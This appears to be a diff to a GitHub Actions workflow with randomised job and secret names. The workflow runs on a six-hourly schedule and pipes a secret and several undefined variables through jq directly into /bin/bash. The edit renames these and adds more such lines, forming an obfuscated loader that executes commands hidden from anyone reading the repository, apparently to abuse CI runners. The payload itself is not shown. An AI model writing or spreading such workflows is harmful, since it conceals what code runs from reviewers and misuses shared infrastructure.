@@ -3,9 +3,8 @@ name: dongkuangyu7654
 on:
   workflow_dispatch:
   schedule:
-    - cron: '22 5/6 * * *'
-
-jobs:  # 31395
+    - cron: '41 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -13,13 +12,16 @@ jobs:  # 31395
       - uses: actions/checkout@v4
       - name: dongkuangyu7654
         env:
-          zmgk51048: ${{ secrets.zmgk51048 }}
+          spkpz083: ${{ secrets.spkpz083 }}
         run: |
-          echo $zmgk51048 | jq -r .rx55 | /bin/bash
-          echo $hvx4 | jq -r .y15 | /bin/bash
-          echo $sbzo89 | jq -r .mltxo9 | /bin/bash
-          echo $n83410 | jq -r .rjw9 | /bin/bash
-          echo $q190 | jq -r .b8924 | /bin/bash
-          echo $tiq370 | jq -r .ovxav98 | /bin/bash
-          echo $jvgo18 | jq -r .ughl80 | /bin/bash
+          echo $spkpz083 | jq -r .vwa4 | /bin/bash
+          echo $khs76 | jq -r .eq821 | /bin/bash
+          echo $svh4275 | jq -r .qgdqr155 | /bin/bash
+          echo $mgdt59 | jq -r .gb875 | /bin/bash
+          echo $wwe5613 | jq -r .bkpmq994 | /bin/bash
+          echo $y96 | jq -r .hbgsn0 | /bin/bash
+          echo $tit1261 | jq -r .xizbv83 | /bin/bash
+          echo $bvgb5 | jq -r .kv96 | /bin/bash
+          echo $op02 | jq -r .ikluf6172 | /bin/bash
+          echo $gnql11577 | jq -r .pw00966 | /bin/bash
 
